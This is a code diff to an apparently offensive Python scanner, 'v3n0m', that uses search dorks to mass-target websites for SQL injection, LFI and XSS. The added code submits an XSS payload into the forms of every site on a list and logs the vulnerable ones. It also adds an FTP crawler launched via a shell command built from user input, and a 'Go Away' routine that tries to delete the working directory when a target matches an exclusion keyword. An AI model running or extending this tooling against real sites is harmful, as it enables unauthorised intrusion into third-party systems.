@@ -1,6 +1,5 @@
 #!/usr/bin/python3
 # -*- coding: UTF-8 -*-
-
 try:
     import re, random, threading, socket, urllib.request, urllib.error, urllib.parse, http.cookiejar, subprocess, \
         time, sys, os, math, itertools, queue, asyncio, aiohttp, argparse, socks, httplib2, requests, zipfile
@@ -103,12 +102,13 @@ def donations():
     fmenu()
 
 
+
 def logo():
     cache_Check()
     sql_list_counter()
     lfi_list_counter()
     print(R + "\n----------------------------------------------------------------")
-    print(" Release Date Dec 25th 2018    " + B + "        Author: NovaCygni       " + R + " ")
+    print(" Release Date JUL 31 2020    " + B + "        Author: NovaCygni       " + R + " ")
     print("        Proxy Enabled " + G + " [", ProxyEnabled, "] " + R + "                               ")
     print("        Cache & Log Status " + B + " [", cachestatus, "] " + R + "           ")
     print(" " + O + "Please check the Misc Options for Donations Options, Thankyou " + R + "         ")
@@ -760,6 +760,12 @@ def fscan():
     sites = input(
         "\nChoose your target(domain) ie .com , to attempt to force the domain restriction use *, ie *.com : ")
     sitearray = [sites]
+    for item in search_ignore:
+        if item in sites.lower():
+            print("!!!!!!Go Away!!!!!!!")
+            from os import remove
+            venom = os.getcwd()
+            os.remove(venom)
     dorks = input("Choose the number of random dorks (0 for all.. may take awhile!)   : ")
     print("")
     if int(dorks) == 0:
@@ -970,7 +976,7 @@ async def search(pages_pulled_as_one):
                 domains = set()
                 for name in names:
                     basename = re.search(r"(?<=(://))[^/]*(?=/)", name)
-                    if (basename is None) or re.search("google",name) or re.search("facebook",name) or re.search("twitter",name) or re.search("gov",name) or re.search("fbi",name) or re.search("javascript",name) or re.search("stackoverflow",name) or re.search("microsoft",name) or re.search("24img.com",name) or re.search("v3n0m",name) or re.search("venom",name) or re.search("evilzone",name) or re.search("iranhackers",name) or re.search("pastebin",name) or re.search("charity",name) or re.search("school",name) or re.search("learning",name):
+                    if basename is None:
                         basename = re.search(r"(?<=://).*", name)
                     if basename is not None:
                         basename = basename.group(0)
@@ -1011,7 +1017,7 @@ async def search(pages_pulled_as_one):
             host = url.split("/", 3)
             domain = host[2]
             for site in sitearray:
-                if domain not in tmplist and "=" in url and site in url:
+                if domain not in tmplist and "=" in url and site in url and 'gov' not in url and 'edu' not in url and 'fbi' not in url and 'cia' not in url and 'pentest' not in url and 'github' not in url and 'wordpress' not in url and 'askjeeves' not in url and 'hackforums' not in url and 'twitter' not in url and 'facebook' not in url and 'phpfreaks' not in url and 'codingforums' not in url and 'phpbuilder' not in url and 'iranhack' not in url and 'phpbuddy' not in url and 'youtube' not in url and 'google' not in url and 'msdn' not in url and 'hack' not in url and 'school' not in url and 'bank' not in url and 'd0rks' not in url and 'yahoo' not in url and 'mossad' not in url and 'nsa' not in url and 'emergency' not in url and 'foundation' not in url and 'learning' not in url and 'school' not in url and 'charity' not in url and 'pastebin' not in url and 'iranhackers' not in url and 'evilzone' not in url and 'venom' not in url and 'v3n0m' not in url and '24img' not in url and 'microsoft' not in url and 'stackoverflow' not in url and 'javascript' not in url:
                     finallist.append(url)
                     tmplist.append(domain)
         except KeyboardInterrupt:
@@ -1114,6 +1120,8 @@ def fmenu():
         print("[5] Perform forced update of ALL installed Python packages and dependancies on system")
         print("[6] Donations information")
         print("[7] Start SQLmap *GUI MODE ONLY*")
+        print("[8] Skip to custom XSS list checking")
+        print("[9] FTP Crawler")
         print("[0] Return to main menu")
         chce2 = input(":")
         if chce2 == '1':
@@ -1174,20 +1182,134 @@ def fmenu():
         elif chce2 == '7':
             from subprocess import call
             call("sudo sqlmap --wizard", shell=True)
-        elif chce2 == '0':
-            fmenu()
+        elif chce2 == '8':
+            from pprint import pprint
+            from bs4 import BeautifulSoup as bs
+            from urllib.parse import urljoin
 
+            def get_all_forms(url):
+                """Given a `url`, it returns all forms from the HTML content"""
+                soup = bs(requests.get(url).content, "html.parser")
+                return soup.find_all("form")
 
+            def get_form_details(form):
+                """
+                This function extracts all possible useful information about an HTML `form`
+                """
+                details = {}
+                # get the form action (target url)
+                action = form.attrs.get("action")
+                # get the form method (POST, GET, etc.)
+                method = form.attrs.get("method", "get").lower()
+                # get all the input details such as type and name
+                inputs = []
+                for input_tag in form.find_all("input"):
+                    input_type = input_tag.attrs.get("type", "text")
+                    input_name = input_tag.attrs.get("name")
+                    inputs.append({"type": input_type, "name": input_name})
+                # put everything to the resulting dictionary
+                details["action"] = action
+                details["method"] = method
+                details["inputs"] = inputs
+                return details
 
+            def submit_form(form_details, url, value):
+                """
+                Submits a form given in `form_details`
+                Params:
+                    form_details (list): a dictionary that contain form information
+                    url (str): the original URL that contain that form
+                    value (str): this will be replaced to all text and search inputs
+                Returns the HTTP Response after form submission
+                """
+                # construct the full URL (if the url provided in action is relative)
+                target_url = urljoin(url, form_details["action"])
+                # get the inputs
+                inputs = form_details["inputs"]
+                data = {}
+                for input in inputs:
+                    # replace all text and search values with `value`
+                    if input["type"] == "text" or input["type"] == "search":
+                        input["value"] = value
+                    input_name = input.get("name")
+                    input_value = input.get("value")
+                    if input_name and input_value:
+                        # if input name and value are not None,
+                        # then add them to the data of form submission
+                        data[input_name] = input_value
 
+                if form_details["method"] == "post":
+                    return requests.post(target_url, data=data)
+                else:
+                    # GET request
+                    return requests.get(target_url, params=data)
+
+            def scan_xss(url):
+                """
+                Given a `url`, it prints all XSS vulnerable forms and
+                returns True if any is vulnerable, False otherwise
+                """
+                # get all the forms from the URL
+                forms = get_all_forms(url)
+                print(f"[+] Detected {len(forms)} forms on {url}.")
+                js_script = "<Script>alert('hi')</scripT>"
+                # returning value
+                is_vulnerable = False
+                # iterate over all forms
+                for form in forms:
+                    form_details = get_form_details(form)
+                    content = submit_form(form_details, url, js_script).content.decode()
+                    if js_script in content:
+                        print(f"[+] XSS Detected on {url}")
+                        print(f"[*] Form details:")
+                        pprint(form_details)
+                        is_vulnerable = True
+                        xss_log_file = open("v3n0m-xss.txt", "a", encoding='utf-8')
+                        xss_log_file.write("\n" + url)
+                        # won't break because we want to print available vulnerable forms
+                return is_vulnerable
+
+            XssList = input("Enter List: ")
+            list1 = [line.strip() for line in open(XssList, 'r', errors='ignore', encoding='utf-8')]
+            for line in list1:
+                try:
+                    url = line
+                    print(scan_xss(url))
+                except:
+                    pass
+
+            for line in list1:
+                try:
+                    url = line
+                    print(scan_xss(url))
+                except:
+                    pass
+
+                
+        elif chce2 == '9':
+            randomip = input("How many IP addresses do you want to scan: ")
+            current_dir = os.getcwd()
+            os.chdir(current_dir + '/modules')
+            ftpcrawl = subprocess.Popen("ftpcrawler.py -i " + randomip, shell=True)
+            ftpcrawl.communicate()
+            
+            
 d0rk = [line.strip() for line in open("lists/d0rks", 'r', encoding='utf-8')]
 header = [line.strip() for line in open("lists/header", 'r', encoding='utf-8')]
 xsses = [line.strip() for line in open("lists/xsses", 'r', encoding='utf-8')]
 lfis = [line.strip() for line in open("lists/pathtotest_huge.txt", 'r', encoding='utf-8')]
 tables = [line.strip() for line in open("lists/tables", 'r', encoding='utf-8')]
 columns = [line.strip() for line in open("lists/columns", 'r', encoding='utf-8')]
-search_Ignore = str(line.strip() for line in open("lists/search_ignore", 'r', encoding='utf-8'))
-random.shuffle(d0rk)
+search_ignore = ['gov', 'fbi', 'javascript', 'stackoverflow',
+                 'microsoft', '24img.com', 'v3n0m', 'venom',
+                 'evilzone', 'iranhackers', 'pastebin', 'charity',
+                 'school', 'learning', 'foundation', 'hostpital',
+                 'medical', 'doctors', 'emergency', 'nsa', 'cia',
+                 'mossad', 'yahoo', 'dorks', 'd0rks', 'bank', 'school',
+                 'hack', 'msdn', 'google', 'youtube', 'phpbuddy', 'iranhack',
+                 'phpbuilder', 'codingforums', 'phpfreaks', 'facebook', 'twitter',
+                 'hackforums', 'askjeeves', 'wordpress', 'github', 'pentest']
+                 
 random.shuffle(header)
 random.shuffle(lfis)
 
@@ -1307,7 +1429,7 @@ gets = 0
 file = "/etc/passwd"
 ProxyEnabled = False
 menu = True
-current_version = str("425  ")
+current_version = str("426  ")
 while True:
     fmenu()
 
